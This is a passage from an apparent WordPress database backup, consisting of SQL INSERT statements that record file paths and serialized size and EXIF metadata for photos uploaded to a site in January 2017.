camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2341","1102","_wp_attached_file","2017/01/IMG-20161220-WA0015.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2342","1102","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0015.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0015-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0015-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0015-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0015-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0015-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0015-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0015-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0015-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2343","1103","_wp_attached_file","2017/01/DSC01389.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2344","1103","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1536;s:6:\"height\";i:2048;s:4:\"file\";s:20:\"2017/01/DSC01389.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:20:\"DSC01389-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:20:\"DSC01389-225x300.jpg\";s:5:\"width\";i:225;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:21:\"DSC01389-768x1024.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:21:\"DSC01389-768x1024.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:20:\"DSC01389-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:20:\"DSC01389-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:20:\"DSC01389-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:18:\"DSC01389-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:3:\"2.8\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:8:\"DSC-W220\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:10:\"1302299129\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:4:\"5.35\";s:3:\"iso\";s:3:\"400\";s:13:\"shutter_speed\";s:4:\"0.04\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2345","1104","_wp_attached_file","2017/01/IMG-20161220-WA0017.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2346","1104","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0017.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0017-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0017-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0017-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0017-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0017-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0017-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0017-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0017-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2347","1105","_wp_attached_file","2017/01/IMG-20161220-WA0021.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2348","1106","_wp_attached_file","2017/01/DSC01391.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2349","1105","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0021.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0021-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0021-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0021-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0021-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0021-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0021-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0021-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0021-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2350","1106","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1536;s:6:\"height\";i:2048;s:4:\"file\";s:20:\"2017/01/DSC01391.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:20:\"DSC01391-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:20:\"DSC01391-225x300.jpg\";s:5:\"width\";i:225;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:21:\"DSC01391-768x1024.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:21:\"DSC01391-768x1024.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:20:\"DSC01391-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:20:\"DSC01391-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:20:\"DSC01391-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:18:\"DSC01391-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:3:\"2.8\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:8:\"DSC-W220\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:10:\"1302299154\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:4:\"5.35\";s:3:\"iso\";s:3:\"400\";s:13:\"shutter_speed\";s:4:\"0.04\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2351","1107","_wp_attached_file","2017/01/IMG-20161220-WA0022.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2352","1107","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0022.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0022-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0022-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0022-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0022-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0022-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0022-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0022-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0022-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2353","1108","_wp_attached_file","2017/01/IMAG0375.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2354","1108","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1600;s:6:\"height\";i:1200;s:4:\"file\";s:20:\"2017/01/IMAG0375.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:20:\"IMAG0375-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:20:\"IMAG0375-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:20:\"IMAG0375-768x576.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:21:\"IMAG0375-1024x768.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:768;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:20:\"IMAG0375-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:20:\"IMAG0375-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:20:\"IMAG0375-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:18:\"IMAG0375-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:14:\"Mustafa ülgen\";s:6:\"camera\";s:9:\"HTC_P3450\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:10:\"1261586806\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2355","1109","_wp_attached_file","2017/01/IMG-20161220-WA0023.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2356","1109","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0023.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0023-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0023-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0023-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0023-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0023-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0023-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0023-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0023-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2357","1110","_wp_attached_file","2017/01/IMG-20160323-WA0002.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2358","1111","_wp_attached_file","2017/01/IMG-20161220-WA0024.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2359","1110","_wp_attachment_metadata","a:5:{s:5:\"width\";i:960;s:6:\"height\";i:1280;s:4:\"file\";s:31:\"2017/01/IMG-20160323-WA0002.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20160323-WA0002-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20160323-WA0002-225x300.jpg\";s:5:\"width\";i:225;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:32:\"IMG-20160323-WA0002-768x1024.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20160323-WA0002-768x1024.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20160323-WA0002-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20160323-WA0002-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20160323-WA0002-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20160323-WA0002-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2360","1111","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0024.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0024-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0024-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0024-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0024-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0024-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0024-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0024-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0024-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2361","1112","_wp_attached_file","2017/01/IMG-20161220-WA0025.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2362","1112","_wp_attachment_metadata","a:5:{s:5:\"width\";i:720;s:6:\"height\";i:1280;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0025.jpg\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0025-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0025-169x300.jpg\";s:5:\"width\";i:169;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0025-576x1024.jpg\";s:5:\"width\";i:576;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0025-720x230.jpg\";s:5:\"width\";i:720;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0025-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0025-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0025-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2363","1113","_wp_attached_file","2017/01/IMG-20160323-WA0003.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2364","1113","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:960;s:4:\"file\";s:31:\"2017/01/IMG-20160323-WA0003.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20160323-WA0003-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20160323-WA0003-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20160323-WA0003-768x576.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20160323-WA0003-1024x768.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:768;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20160323-WA0003-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20160323-WA0003-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;